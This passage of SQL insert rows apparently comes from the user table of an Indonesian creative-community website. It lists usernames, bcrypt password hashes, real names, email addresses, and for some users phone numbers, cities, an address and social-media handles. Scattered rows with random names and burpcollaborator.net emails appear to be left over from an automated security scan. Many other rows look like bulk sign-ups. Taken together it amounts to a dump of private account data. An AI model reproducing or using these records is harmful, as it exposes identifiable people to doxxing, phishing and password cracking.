('ELHXGTdD', '$2y$10$snwYHiiAh1iaDcPNydMemO4rU.ZF2igP9R.Z7S6.raUmb9URVWRH.', 'DXWkOPzG', 'lflKAQqS@burpcollaborator.net', '', '', '', '4980', '', '', '', 2, '', 0, ''),
('ellautami6330', '$2y$10$M.ImSVs4uZkPAt13FicU/.OWInD.7sKPkbumRA8A03sd4KMnycZ0.', 'SULARTO', 'lucassemensato86@gmail.com', '', '', 'Lain - Lain', '11621', '', '', '', 2, '', 0, ''),
('erfran_darmawan', '$2y$10$yZhXgMYVjikI57BL8xAU3eVi3/fPsQASVzvq6Hj4C4UBwsSZ5JwEi', 'B. Erfransyah Levi Darmawan', 'franslevi008@gmail.com', '085157706834', 'Bandung', '2D', '55802', 'https://www.instagram.com/erfran_darmawan', 'https://twitter.com/erfran_darmawan', '', 2, '', 0, ''),
('ervinartha', '$2y$10$bk2p/dT0zsqDQRj1dP2Gs.UYvvszJ1mTfU023rgijBcEszo6cbpoq', 'ervinartha', 'hervinartha@gmail.com', '', '', '2D', '89697', '', '', '', 2, '', 0, ''),
('Fade3117', '$2y$10$lFfug0g.lMEBvbiBr41vdeuj3wo0O9jBVPJw10oT5UDg.ylvPkE4i', 'Fadhil Ghifari', 'fadhil17ghifari@gmail.com', '', '', '2D', '70180', '@nyantaiduls', '', '', 2, '', 0, ''),
('farahlaksamawati4086', '$2y$10$JMIlOe9Kre2ZL.UCEn4Y2Of5BHcMudD11pPwj1O.72XKIsl8i3rDq', 'SAIMAN', 'marlenecolog@gmail.com', '', '', 'Lain - Lain', '58750', '', '', '', 2, '', 0, ''),
('febrianamuliana2199', '$2y$10$uWqOSSKJVrCEn1q5JdRpYu7jaUJz361uxlf0tKoKaSfXid0p54ABi', 'ELVANA KURNIASARI', 'britokatia@outlook.com', '', '', 'Lain - Lain', '48653', '', '', '', 2, '', 0, ''),
('febrianamuliana5101', '$2y$10$QuzD9zJ0nzq.bC50xRxDnu1qPCzyn8orAaZyDRAIfhZqHURjiieem', 'IKA RISTYOWATI', 'vieirakamila89@gmail.com', '', '', 'Lain - Lain', '85516', '', '', '', 2, '', 0, ''),
('fenyvernita940', '$2y$10$bZhLnaZkm9loa6Kt3KkL6OrAaLejbE2sBXy6WjlwnecvvdGpcN0bK', 'NURMULATO', 'lucasotesta@gmail.com', '', '', 'Lain - Lain', '67154', '', '', '', 2, '', 0, ''),
('fGSokTbA', '$2y$10$py/f3DX9bNmTCujeFGw0OeL81dqfOV76IqZWRZ19mUm1rFzQUG6/6', 'eoChocSC', 'DMVubzsW@burpcollaborator.net', '', '', '', '38121', '', '', '', 2, '', 0, ''),
('firadayo', '$2y$10$aMSPncI5JQbJznFj1pwlK.F5pHsFjKpjxY.pM1VFjLB4RAT5gA7Ma', 'Fira', 'firawulandari126@gmail.com', '', '', '2D', '63383', '', '', '', 2, '', 0, ''),
('fitrianafatmawati7030', '$2y$10$Wqger8Nw/l9LKL85HvP3Aesm.NxmFuTMNWnTui5dVtGkqqZr4yjq6', 'TUGINI', '986196236silva@gmail.com', '', '', 'Lain - Lain', '38940', '', '', '', 2, '', 0, ''),
('fitrilarasati9449', '$2y$10$AU7/JWomVWvBYa6zAjNNyusGUS5yYIIR6ODs9HokKf14qBFLL6VmG', 'SRI SUPARMI', 'alinebsjp@hotmail.com', '', '', 'Lain - Lain', '14480', '', '', '', 2, '', 0, ''),
('fitrilidia2517', '$2y$10$qtDk3S9LkiVvpRl91G1I5eRNrjSx8ZzK5ebZoS9d4HBdocy1rjGpu', 'JUMADI', 'diogomigli9492@gmail.com', '', '', 'Lain - Lain', '79061', '', '', '', 2, '', 0, ''),
('fukaan', '$2y$10$qUmPzBZyG/kbtebYXPWlIelBlfLdibcUlOKTrJv/GWSVK4ih5.bWq', 'Fikran Hadinata', 'fikranhadinata@gmail.com', '081344705615', 'Malang, Jawa Timur', '2D', '68770', '@fukaan', '@fukaan23', '', 2, '', 0, ''),
('gatot', '$2y$10$1VGXBtQbSFVLBk8KdHXzp.Db7HosZxkSFdoNdozwnrB.GOPsug/pG', 'gatot', '', '08123123123', 'Cimahi ', '', '92127', 'Instagram', 'Ini Twitter', '', 2, '1636969210_gatot_732068362.jpg', 1, '1636963594'),
('gGUfxOGN', '$2y$10$CEbV/DvG883rlv.NDgpJMe7rsAam5hs4YISflNVOHNDlCWDtFMEMG', 'tLvKWPcU', 'sYOQzxLb@burpcollaborator.net', '', '', '', '3449', '', '', '', 2, '', 0, ''),
('ginaarianda2074', '$2y$10$KBbjQ/umW/BISULsyc16pu1kUBNmG/PcwhobCKdnJTo4yQeCipoxS', 'AUREL BELLA CANTIKA', 'patribonalume@gmail.com', '', '', 'Lain - Lain', '85235', '', '', '', 2, '', 0, ''),
('ginaarianda2501', '$2y$10$gLmaCVvcytTiFn4ZmMsaC.1cwiec78jrj5TzUosijGbRCxkZDRgmW', 'SADIMAN KARSODIYONO', 'franciscosiqueiralindo@live.com', '', '', 'Lain - Lain', '74051', '', '', '', 2, '', 0, ''),
('ginaarianda4265', '$2y$10$nrptLtwuyhz1C0zNfGRh7eVpaz2Tzqrnt5wRCamzQURSNvps2nomm', 'WAHYU ADI DARMAWAN', 'vanessaespacomillu@icloud.com', '', '', 'Lain - Lain', '95378', '', '', '', 2, '', 0, ''),
('ginaarianda9540', '$2y$10$CViTehJ91hf2y5q.dcXXP.w5FFbf4RtqpakNG7gCweUAlvQ.SS722', 'HARYONO', 'garota.leka@hotmail.com', '', '', 'Lain - Lain', '70701', '', '', '', 2, '', 0, ''),
('Gorerilaze', '$2y$10$Qs7jIySv3nXCMpXfJfdgrOs48zhOeaUh9EkMk8dK19soOGDvc5Mni', 'Fahmi M Hendryan', 'hendryanbusiness@gmail.com', '', 'Tasikmalaya', '2D', '74029', '@gorerilaze', '@gorerilaze', '', 2, '', 0, ''),
('gracedasopang9243', '$2y$10$FiDOxireGOl9I6ZBJTGNAONpj8gL/dxRcKWsw91rrBhvxaEQiv2zW', 'SUPONO', 'lara.jcandido@icloud.com', '', '', 'Lain - Lain', '83355', '', '', '', 2, '', 0, ''),
('GsNdZPRb', '$2y$10$12eQzq2t/aDSjWsfYMEfAu4KOc0ijuOOTiS8fSLEWrCoFVewyKrO.', 'ouki3xjemr9anxrnxh8gkz29vbohfy6wzdp2', 'jgi2pv5c8pv89vdljfue6xo7h9af1wsulbb0', 'xecunp366jt27pb', 'gvfe4sk9nma5ossiyc9blu34w6pcgt7r08qx', '', '59081', 'tw2z5flwo9bspft5zzaymh4rxtqzhg8e1vrk', 'hlj8uwaddq09ewimogzfbyt8mafg6xxvqcg1', '', 2, '', 0, ''),
('gXZhtQrB', '$2y$10$xgjJhUYRfmg2rga.rln8EOQZU4KY9uD2Zh/TLttrOQwaIjayYnN82', 'DJMCxXpd', 'xjKtvWXy@burpcollaborator.net', '', '', '', '96989', '', '', '', 2, '', 0, ''),
('Hacosun', '$2y$10$Gy4L4GfV4/nH77Fzm0ifU.DqAzvh7pHl4WuNdukO/3spnVMNwQpNi', 'Dwi Hadi Prasetyo', 'dwihadiprasetyo23@gmail.com', '', '', '2D', '97323', 'Dwihadiprasetyo__', '@hacosuneater', '', 2, '', 0, ''),
('hafidh avila', '$2y$10$Hs6N9nHR8EkIzEFQF6cXPe9O2DHuZNmywBg6mUdaZnQsLq3APR1oG', 'hafidh avila shira', 'avilashira@gmail.com', '085865290190', '', 'Fotografi', '16345', 'havila.photo', '', '', 2, '', 0, ''),
('haiaan', '$2y$10$3DrhuwV09TS69tB8N40RZO0NR75z5m/Q93bL2HXoBAMEskAbMazUe', 'Aan Ainun Najib', 'doncolour@gmail.com', '', '', '2D', '99487', 'https://www.instagram.com/haaiaan/', 'https://twitter.com/haiaan', '', 2, '', 0, ''),
('halimah.lara', '$2y$10$sPbLA9hMXMJaRm06IjSKKu5G/6IZDhxclRIqvlD9UcKFvpL.GLqQa', 'EFFENDI WIJAYA', 'eliannetenorio@hotmail.com', '', '', 'Lain - Lain', '11545', '', '', '', 2, '', 0, ''),
('hannahbaruara9130', '$2y$10$JdrAadoCi2jeHyExli/CqeDh6QHgE4jwj5bmt5QfhEqOHd1t26ybq', 'M ACHMADI', 'tucca.13@hotmail.com', '', '', 'Lain - Lain', '71427', '', '', '', 2, '', 0, ''),
('hansaneh', '$2y$10$tn6ULwQh3qZNOJ0NHPA48uuViAzFJvhecAcIZgY2z.BZUCIMFWS7K', 'Hans Kotaro', 'hanskotaro@gmail.com', '', '', '2D', '27034', '', '', '', 2, '', 0, ''),
('Hansky', '$2y$10$nNzwNYP/8COQPkLlkuqFnug/1BSYdKFBptErzPQKsXiVvXU5e9Ufm', 'Premzky Hansky', 'premzky.h@gmail.com', '082288171225', 'Perum Marcelia no 82', '2D', '75661', '@premzky_wazowsky', '', '', 2, '', 0, ''),
('HcmHEpRb', '$2y$10$LEh3RO7U9GxHlPD2uSjz1On8LnlwCD/JFdK9JqT4I3TA9Vfh5F8o2', 'sVtdjttu', 'wJkMqRrW@burpcollaborator.net', '', '', '', '38976', '', '', '', 2, '', 0, ''),
('hennywirayatma1769', '$2y$10$b07qcAvlKvIaRPx9irjk/.SVUsquasfHIksDJOj0gXPp.2r9iG36.', 'EMA EXSANTI DWIPUTRA SE', 'gabitesser01@gmail.com', '', '', 'Lain - Lain', '7575', '', '', '', 2, '', 0, ''),
('hennywirayatma2973', '$2y$10$pzC5275UpZfKyQpKUyvKZO64DKP/iiFCjVGw3VM/PzyJbjyNqhslC', 'JOKO SUSILO', 'kamillig84@gmail.com', '', '', 'Lain - Lain', '80315', '', '', '', 2, '', 0, ''),
('hennywirayatma6937', '$2y$10$/cWKM2JLueX0HCLoESpncuqXP5h8pFPlzcqt4UrW0ewdL4XJakOZ6', 'KARIYEM', 'lucas.studiolrp@gmail.com', '', '', 'Lain - Lain', '58016', '', '', '', 2, '', 0, ''),
('hennywirayatma8631', '$2y$10$9pltxdW8LFPLVn.uRH4uZu66ZuW6Y3QnXAIv9Auyy9tsOKeLXm.7q', 'WALUYO', 'adrielle.albq17@gmail.com', '', '', 'Lain - Lain', '67968', '', '', '', 2, '', 0, ''),
('hermitagestd001', '$2y$10$gxK2kImdguaZjf4IvJJIK.MYfFl2T7hQOnFQxCDWWwjQHUx9YNvyu', 'wafa sabe', 'seoman70@gmail.com', '', '', '2D', '89731', 'https://www.instagram.com/sate12tusuk/', '', '', 2, '', 0, ''),
('heytiyok', '$2y$10$2K7y9LXaZryTiGL9HBC6J.jQymeZV1xRgBPYhhCcNQDayhZmYl0B6', 'PRASETYO WAHYU NUGROHO', 'prasetyowahyunugroho@gmail.com', '082136757980', '', '2D', '35474', 'heytiyok_', 'heytiyok', '', 2, '', 0, ''),
('hilalmuniif', '$2y$10$EbtrDQ5QkCIliWCU3R7/He1kjE41zuQSggHGKN1IfzPnsM2cumaqW', 'Hilal', 'hilalmuniif@gmail.com', '', '', '3D', '84975', '@hilalmuniif', '', '', 2, '', 0, ''),
('Husain anwarudin', '$2y$10$zmmL7UvfhUPDvP8iK/wCTeQARNqTlj2tgr4ck.imSr1I7Ld1KYehG', 'Husain anwarudin', 'nyanmaru.art@gmail.com', '', '', '2D', '35015', 'Husainanwarudin', '', '', 2, '', 0, ''),
('hyppolab', '$2y$10$yTgYSmwnECpj3rrcj1wX..6PqNr6RiSk9TY.NOAspOxm9Lf2RB3V6', 'Bastian Bentra', 'vandlycan@gmail.com', '', '', '2D', '53703', '', '', '', 2, '', 0, ''),
('HYtMKgxu', '$2y$10$.R7m581iA8IZf0/idJRNWeop6HU1LoxsLB.ZAPoymc4EUPTjg67Yy', 'gIHUjMcC', 'GuWFaLWu@burpcollaborator.net', '', '', '', '93153', '', '', '', 2, '', 0, ''),
('hyYwpmAD', '$2y$10$jGfSZRhDvSsAT1LY7ssxT.HIZ9Lt2d3a4zFETLr5VenLq6BXPCKem', 'uMhQFvWb', 'iYUMZhvk@burpcollaborator.net', '', '', 'Motion', '59692', '', '', '', 2, '', 0, ''),
('Idot', '$2y$10$/3SjwyTlSgwanXehmVl6E.4uDHr61EXB2bRYuVr3Hh4HVlC9ydgOe', 'Aldy', 'aldiardyan@gmail.com', '', '', '2D', '39462', '', '', '', 2, '', 0, ''),
('IdtOMeFO', '$2y$10$Ig1w4c0yKKmBCeUPwpUoMeAtWLo02rzIwRcQ3z8yLsMLz9hkOi8WK', 'MTsJDCSm', 'RBMyfKZI@burpcollaborator.net', '', '', '', '5919', '', '', '', 2, '', 0, ''),
('iHUfQYWd', '$2y$10$aa6CfwmAlx5h1dSVfrbb/../F0hlS.kNZBddZ4Lb.9v8akkgJ40.K', 'gVGIKuAO', 'gBdoVZjP@burpcollaborator.net', '', '', '', '63534', '', '', '', 2, '', 0, ''),
('iichikun', '$2y$10$/wvwHT0YqdcH/zO1MBxgrOo/j.3VeYAyAMHVmumzwkStOFkSGYJJ6', 'Eka Putra', 'ekajulyana11@gmail.com', '', '', '2D', '33453', 'https://www.instagram.com/iichikun/', 'https://twitter.com/Eka_J_Putra', '', 2, '', 0, ''),
('ijsQDotE', '$2y$10$hMtXJaS0EbTswZXSS07T3ej.hTYXLNivQA2.nHInN3V1QtSRedNyK', 'ijsQDotE', 'ijsQDotE@burpcollaborator.net', '', '', '', '91417', '', '', '', 2, '', 0, ''),
('Ilakpzse', '$2y$10$OM8T7.19gnFD.hjb/Kovce8SEWvh7KfYtTasHiiF8MliftGwLVHG2', 'LVMbULsB', 'aCNXGOAx@burpcollaborator.net', '', '', 'Fotografi', '81717', '', '', '', 2, '', 0, ''),
('Ilham.boam', '$2y$10$ZEXFcTI8EovADj438kOw/OiAKOZG25CAvfdNySjI9iwNT0nm3lJrm', 'Mochammad ilham putera', 'ilham.putera.chan@gmail.com', '', 'Jakarta', '2D', '23670', '@ilham.boam', '', '', 2, '', 0, ''),
('indahdinaya5836', '$2y$10$KH7HVc2bTx4O.pXzGSF.SORAsrH3b/rjWPpD0lhdm0ryFdP9orHvG', 'KARINO', 'gilmanascimentonoel@hotmail.com', '', '', 'Lain - Lain', '21983', '', '', '', 2, '', 0, ''),
('indahfebriana5887', '$2y$10$eQMVET9U2l6jEmBHAIxMNebtv/yCZo9BaQx03GhyplZk0el/o8zW6', 'RIZKI AMALIA', 'isabellafcostaaa@gmail.com', '', '', 'Lain - Lain', '30594', '', '', '', 2, '', 0, ''),
('indahfernita2916', '$2y$10$JJDBTqcA42To7HnL4keux.RRCXw1SBP6erO83nJVkKisbaplK0TA6', 'BONDAN ROYYAN ALFAYAT', 'dany_copette@hotmail.com', '', '', 'Lain - Lain', '39186', '', '', '', 2, '', 0, ''),
('indahfernita5128', '$2y$10$HWet534ba.Gqb1nyYLiG3.tdLgJEfClJ7rdJ/yjkhqG2yoqwSo9j2', 'KALISTA MAHARANI', 'suellypereira2009@hiotmail.com', '', '', 'Lain - Lain', '1730', '', '', '', 2, '', 0, ''),
('indahfitriana2297', '$2y$10$/NVqwOom0sTi.QAnqM6hH.mtqN/0ziVnOuPNkhiOPBoR0sGKkri0G', 'SAVA NANDA SAFITRI', 'carlasantoseq@gmail.com', '', '', 'Lain - Lain', '50925', '', '', '', 2, '', 0, ''),
('indahfitriana2869', '$2y$10$B0btlMvXV669PqLA6fw5Yu31BZ5i1Rzr938XKrzVpVbpyip1H..Hy', 'SULARSI', 'Santina.tamashiro@gmail.com', '', '', 'Lain - Lain', '56348', '', '', '', 2, '', 0, ''),
('indahfitriana5417', '$2y$10$CU2HFzOKdz7KNz2YMYxacuiBc73fXFZCfsHQMMREE6guCrcqO5Jiu', 'AHMAD MAULANA', 'cherity2012@hotmail.com', '', '', 'Lain - Lain', '16037', '', '', '', 2, '', 0, ''),
('indahfitriana6367', '$2y$10$a7qs3R/jC63HSmE.t.X1D.bzFXRlxIWae/xyw.uZRPCI46dPwDf2S', 'FEBRI ISMAIL', 'cidafirminoperachi@hotmail.com', '', '', 'Lain - Lain', '58666', '', '', '', 2, '', 0, ''),
('indahlarasati3924', '$2y$10$ycXA6cAHxKWbBwJsvXfD7eWakeyUPOp2i/mK.45XeGRB0DPOhVv2O', 'SURYANINGSIH', 'isabella-passos@outlook.com', '', '', 'Lain - Lain', '95005', '', '', '', 2, '', 0, ''),
('indahlarasati4567', '$2y$10$nY2vGo1o6nfBQZwii3DiyOuw1t0xdoHVu5DUbhZWHKyRVr.xAgObi', 'TARNI', 'jacksonmatheusoliveira340@gmail.com', '', '', 'Lain - Lain', '48161', '', '', '', 2, '', 0, ''),
('indahlarasati7633', '$2y$10$ZEzWZ.hvAgPucP7TcK6gBOUxp2hItAGia7qexKDIwuwvatpAVdJWe', 'PARMI', 'nataliatriches@gmail.com', '', '', 'Lain - Lain', '6465', '', '', '', 2, '', 0, ''),
('indahlarasati7772', '$2y$10$P1ZaNBPHw1kOHgctJMV3KeaghNGtmAdjJ6PhJ0OA/ju158l7EKNFe', 'MULYANI', 'vanialima2011@gmail.com', '', '', 'Lain - Lain', '50713', '', '', '', 2, '', 0, ''),
('indahlarasati8298', '$2y$10$9LETAfbUep3zzXxDykcH6OQJ.FNX5OtKGbM7zpYP3tQkgkrpqpWNG', 'SUKINO KROMO DIYONO', 'lizy.bofer@gmail.com', '', '', 'Lain - Lain', '86566', '', '', '', 2, '', 0, ''),
('indahlarasati8829', '$2y$10$f8yZGhgOIdIADasRp1a4F.nmTTrtkNHeAnGiKviWCcsTbTSp4WrYm', 'NADYA NURCAHYANI', 'biia_claudia@hotmail.com', '', '', 'Lain - Lain', '21436', '', '', '', 2, '', 0, ''),
('indahlarasati9110', '$2y$10$6WRFoUCRbqtgfTqwIwb.le4tUZioVvKU466pkEj0WeDCNZDkvV8hK', 'MARIMAN', 'nicelmal@hotmail.com', '', '', 'Lain - Lain', '66260', '', '', '', 2, '', 0, ''),
('indahlarasati9196', '$2y$10$HKK1YdSz7BUC6CVrXSJ/HOoaCgiBfxCzVpE.xrxdQKZVwjiQ1Hqoe', 'HERY MURSITO', 'diany.leite@gmail.com', '', '', 'Lain - Lain', '72616', '', '', '', 2, '', 0, ''),
('indahlidia1875', '$2y$10$7fBjoRbTgbWIS3RfpYORquhOSr0M4ifIfpFN9YXMqNleomvZirHE2', 'MUHAMMAD ISNAINI', 'lucileideferreira22@gmail.com', '', '', 'Lain - Lain', '22551', '', '', '', 2, '', 0, ''),
('indahlidia4402', '$2y$10$C.qJNf9FvvI06lycdVjY8..1BHdtRe2Vs7OPXbEj0/SuQNjxhTOKm', 'AD DIFA EZHAR FAHZRIANSYAH', 'tamires12@gmail.com', '', '', 'Lain - Lain', '5371', '', '', '', 2, '', 0, ''),
('indahlidia8004', '$2y$10$MU/EXqlIWYObrqnmHgyM2eoErYN4ozPd8T/3RLFetx6KezoPp1Nmu', 'ALIMAH DHINI NAFIAH', 'hiderlammenezes@hotmail.com', '', '', 'Lain - Lain', '93816', '', '', '', 2, '', 0, ''),
('indrianafatmawati9101', '$2y$10$TAA3Lre7TV9rHjvZosnOUevaC77GlBDZ41yLNBNtHNkV46QY23N2W', 'ARIES KURNIAWAN', 'brunatardi123@gmail.com', '', '', 'Lain - Lain', '33049', '', '', '', 2, '', 0, ''),
('indrianalestari2495', '$2y$10$rIy5ngyGPdCfy8UAl90gv.OE/PYjdVQigv/KJyqtoOmjFZMoCjyOO', 'GHONI QOYYIMAH', 'valeria_cit@hotmail.com', '', '', 'Lain - Lain', '79880', '', '', '', 2, '', 0, ''),
('indrianamariana2375', '$2y$10$Dleb3hwDurvT.3WQYVLQmeEz14UgiJvgfKlR2TZVL5ACHbahUf0Si', 'YUNITA DWI HARIYANI', 'ffrancinilda953@gmail.com', '', '', 'Lain - Lain', '49861', '', '', '', 2, '', 0, ''),
('indrianamariana3083', '$2y$10$i2rdxsBWXa7.L8jb/G3JPuda7ZS7Kqb473g8ddlOvd5yVL06ZXm92', 'TARINA YULIANI', 'brenoaugusto4@gmail.com', '', '', 'Lain - Lain', '29819', '', '', '', 2, '', 0, ''),
('indrianamariana4570', '$2y$10$TexYnxSP0MYdnQ1cO7VfF.Wo/07cCz9vJa4DUVKG2GtEYWVdNTbKy', 'AGUS SUGIYANTO', 'gipilyka@hotmail.com', '', '', 'Lain - Lain', '34711', '', '', '', 2, '', 0, ''),
('indrianamariana7708', '$2y$10$4M1JBLv.TorP48T1XXG0fu49I6k7zbJfiA/d6FSn9h8KvAtKKjGv.', 'SUTARMIN', 'claudineimilani@hotmail.com', '', '', 'Lain - Lain', '2844', '', '', '', 2, '', 0, ''),
('indrianamarianti5740', '$2y$10$W6OKLcWjMlLakpFCz9er1O2dLTog0.K9s9C9DNZSFJOmvxEoEZ5Am', 'PURWANINGSIH', 'msccampos1988@gmail.com', '', '', 'Lain - Lain', '90665', '', '', '', 2, '', 0, ''),
('indrianamarisa4449', '$2y$10$5U9kLkDWzff/ZCqW4S5Xq.uNTLU9Ktif/OGmX9vAx6pmFRjDZCDVm', 'AZIS ARBIAN MAULANA', 'kawanytim@gmail.com', '', '', 'Lain - Lain', '16767', '', '', '', 2, '', 0, ''),
('indrianikurnia8497', '$2y$10$S/p5e2.GnQGmCUZzH1bhIO52FjW5ThaV07A6ui4ASSBnT1qnrNaxO', 'WAHYU PRASETYO', 'karollynevieira39@gmail.com', '', '', 'Lain - Lain', '47837', '', '', '', 2, '', 0, ''),
('indrianiputri3260', '$2y$10$woBbTIPo.wkNbkP64WDmGeWGFgOCpSSmRcoh5pXvmSWDe019GHtvy', 'ISNA NUGRAHA', 'Senhorabeleza123@gmail.com', '', '', 'Lain - Lain', '75626', '', '', '', 2, '', 0, ''),
('indrianiputri7955', '$2y$10$17xsQnQU8EhUIQXZWnOl/eIQsJdDLy3bBJcye9s5x9ytV7LNa3fca', 'ROMLAH', 'ateliejaquemorais169@gmail.com', '', '', 'Lain - Lain', '67807', '', '', '', 2, '', 0, ''),
('indriantiputri1454', '$2y$10$VoE41hiNPTQQjLTVoeTXu.L8C6JcfRtGDNl2zP4lnv56/GqTvlnh.', 'DWIYONO', 'Deuzilenepereira1976@gmail.com', '', '', 'Lain - Lain', '47160', '', '', '', 2, '', 0, ''),
('indriantiputri3911', '$2y$10$eEUYMvhwuqjR8uT3Ylt9suxh/AdEqDAYTq4LSy5EQlOO.pEsKpCGe', 'EDIANTO', 'cristianecruz421@gmail.com', '', '', 'Lain - Lain', '55564', '', '', '', 2, '', 0, ''),
('indriantiputri4930', '$2y$10$XUS0e6SzrXHPHuBQwZenDut5EwBBsCnjEQZKGvPfMDazQhzC/EY4i', 'ADI ATMAJI', 'juan.gingado@gmail.com', '', '', 'Lain - Lain', '8912', '', '', '', 2, '', 0, ''),
('indriantiputri6660', '$2y$10$W0mWlPLep25NClpkWrDzWeKqTwcPN1uJLC9PPD4O4J9ihPBNCnH7O', 'SUTIMAN', 'kitasilva2013@gmail.com', '', '', 'Lain - Lain', '78017', '', '', '', 2, '', 0, ''),
('indriantiputri8290', '$2y$10$/oJFmEzRReOrHAbD0jRCL.4VyiLXx5pNyPCjdOXjNBsF6oam53Nl.', 'SUTRISNO', 'loianee.ferreira@hotmail.com', '', '', 'Lain - Lain', '88604', '', '', '', 2, '', 0, ''),
('indriterianda4659', '$2y$10$hfFsnHagQY6zvAH1aW1ZlOqsgT39UYKcR8WP9u9yP7Y2r.k83OyVK', 'WARTI', 'Thavares2020@gmail.com', '', '', 'Lain - Lain', '8208', '', '', '', 2, '', 0, ''),
('indriterianda9614', '$2y$10$e42.6cdoFht/SgV69wQJy.1p5U7Tow.k1v7ZLAkssW65KcOvUJILq', 'ARIANI ELA ARLITA', 'nilda.moraesb@gmail.com', '', '', 'Lain - Lain', '78682', '', '', '', 2, '', 0, ''),
('indriyulistiana2733', '$2y$10$lWWL1Gj0lO24XdZIQDdurOnQLjRTvmpm97xtEUi2KdnrSfyqkK54G', 'MUNANDAR', 'erikacristina.ecp@gmail.com', '', '', 'Lain - Lain', '55861', '', '', '', 2, '', 0, ''),
('indriyulistiana5935', '$2y$10$uM.jOLaglQmjmOTZ0PkEMOipqvBXyEHsLqMViuHG/BD2ZC0b6BnyK', 'DWI ASTUTI', 'liraamanuela506@gmail.com', '', '', 'Lain - Lain', '22243', '', '', '', 2, '', 0, ''),
('indriyulistiana6659', '$2y$10$gjMtK.vjoSe1Idoio.M.h.bWIRPuj.qnep2kEo.JKscMREdHo5sUK', 'CAHYOKO GALIH WINANDAR', 'rosianecajuru123@gmail.com', '', '', 'Lain - Lain', '70186', '', '', '', 2, '', 0, ''),
('indriyulistiana6901', '$2y$10$ypxmKnDFj1oSuniZTUQzreN/pp/5iFTPbgfbpYZau6qfWQKOP2WkW', 'PURWANTI', 'leandroaleixo27@hotmail.com', '', '', 'Lain - Lain', '35656', '', '', '', 2, '', 0, ''),
('irmamariana8925', '$2y$10$GBQrVkNBkj6ta1IwamePM.rNeHXrytxpLHQpIzThtt1Rq8SZ04cVC', 'DARYONO', 'gardeniasousalima@hotmail.com', '', '', 'Lain - Lain', '47895', '', '', '', 2, '', 0, ''),
('IUnNnQtX', '$2y$10$ZxutYEVweBvMyFQiajfkrO9ohQMechvMSBJHo/8S6uVe.BxFT6/P.', 'bNfXXtAb', 'rmxTbZIn@burpcollaborator.net', '', '', '2D', '45514', '', '', '', 2, '', 0, ''),
('Jajang', '$2y$10$s2KA0raCLcCM8yHu2DVs8.3H8Ph8zTvQwlUr7W.YZSPCxySWJZC8u', 'jajang', 'gatot2018@gmail.com', '', '', '3D', '2810', '', '', '', 2, '', 1, '1636968480'),
('Jamtengahmalam', '$2y$10$4V.MnPdXyIIUkWqr85b6Pu44qX8bUHKABHpyqYDriG7tbEks.bWC2', 'Jamtengahmalam', 'dikizagio@gmail.com', '', '', 'Motion', '40449', '', '', '', 2, '', 0, ''),
('jarwo', '$2y$10$gMpl.Xo2cpEP4gggAWEUke2Atgt7t.lxJnuZU59BlGDekp5gBS4Ui', 'jarwo', 'gatot2018@gmail.com', '', '', '3D', '73278', '', '', '', 2, '', 1, '1636967251'),
('java', '$2y$10$Z4CgLBiUIbYulrjp4hPMDuYMe6Xczsbyn/pYoBl30bBP4eY6aJY26', 'java', 'javatistacipta@gmail.com', '', '', '2D', '72839', '', '', '', 2, '', 0, ''),
('jejen123', '$2y$10$VgAV4HKd8x5p3PqkxVOTbump26z2gzF6dPHNJ0ckCT/cnhain43eq', 'jejen', 'seoman7878@gmail.com', '', '', 'Lain - Lain', '56385', '', '', '', 2, '', 0, ''),
('jessicaamalia3501', '$2y$10$/4yIe4EtmydXREfaVLkSS.Gk28bP4qD6WtnLSIlaxQAEWH61nxY2O', 'AMELIA REVIANA SARI', 'paulacruz.apsc@gmail.com', '', '', 'Lain - Lain', '5763', '', '', '', 2, '', 0, ''),
('jessicaamalia5695', '$2y$10$F4NT50hKZBe.Xc/2gskNzesl.odTB7sheET6u1/cHQu91U1B53fvS', 'FAJAR SYAMSUDIN', 'angelacamargo31@hotmail.com', '', '', 'Lain - Lain', '55796', '', '', '', 2, '', 0, ''),
('jessicaamalia9165', '$2y$10$Svpr5vcHWxUgR3uj9v3JJePOOjUTNiHZbPGSri6QXsrL2yzovDflO', 'RULIYAH', 'Sandra.klunk.sk@gmail.com', '', '', 'Lain - Lain', '33709', '', '', '', 2, '', 0, ''),
('julianiputri1837', '$2y$10$m3v3ETGj5/4BhnChsjUV.uJT9SglEA7tc2ByrCqXMrGpsC66GnebK', 'SRI SUYARMI', 'leiacoutinhoster@gmail.com', '', '', 'Lain - Lain', '88216', '', '', '', 2, '', 0, ''),
('julianiputri2800', '$2y$10$Nw3e5D8I/0qUy3IQEi5bGuNoW1JO3/guURVWh9OGxwN3LEk/2zMUS', 'PRIHATIN', 'silva.jhanuarh@gmail.com', '', '', 'Lain - Lain', '47814', '', '', '', 2, '', 0, ''),
('julianiputri7371', '$2y$10$Cy8MEj.Vq6Jc82ylLrDX4OJiLkWQE5EpEaWcFfT547mEULIJUqt2S', 'NDARI LESTYANINGRUM', 'raixanlu02@gmail.com', '', '', 'Lain - Lain', '19811', '', '', '', 2, '', 0, ''),
('juXFgLBa', '$2y$10$2dzg3Um7Hs/no68OSWqAOu2VQJ2MIfMEOt8W4HfM9WuV6YC6nHQ9W', 'tPDRxDjo', 'xSHtXSyK@burpcollaborator.net', '', '', '', '88138', '', '', '', 2, '', 0, ''),
('KbsofQxy', '$2y$10$NfOgO9kE84FqNN6Yevyn6eVkGG1No5OgyiRJwEdGwuBf1XdIYVLn2', 'wCbLYfAI', 'GGdVhfJa@burpcollaborator.net', '613021', '705715', '', '93551', '963490', '544926', '', 2, '', 0, ''),
('khoiri', '$2y$10$IvjkGRjbfMYzOJhiYQNL6OSrPFlN3an..VSlt3xuJR.UjQKbffmZS', 'nur khoiri muslim', 'nurkhoirimuslim7@gmail.com', '', '', 'Motion', '60818', '', '', '', 2, '', 0, ''),
('kiranamariana1090', '$2y$10$cCQJBEo6ouKsJS/S.2c5rO2TCzFeVrTRNXyfwL4RvjVbOiZd3Qjm.', 'HASAN NAWAWI', 'esmeraldaecia@yahoo.com', '', '', 'Lain - Lain', '6607', '', '', '', 2, '', 0, ''),
('kiranamariana3507', '$2y$10$VpHPLeEtDvzvqnC2/opfOeJwQYQCZEQpMPYaa9ejeAon/6/pjD2Zy', 'SUSANTO', 'iara.102@hotmail.com', '', '', 'Lain - Lain', '84815', '', '', '', 2, '', 0, ''),
('kiranamariana5441', '$2y$10$aI83wUo4nx..cZRIjVThK.35XLeisyHoyyNotIlIvqU71AdPysPwe', 'AZIZ FITRI NUGROHO', 'claudete-iturama@hotmail.com', '', '', 'Lain - Lain', '74251', '', '', '', 2, '', 0, ''),
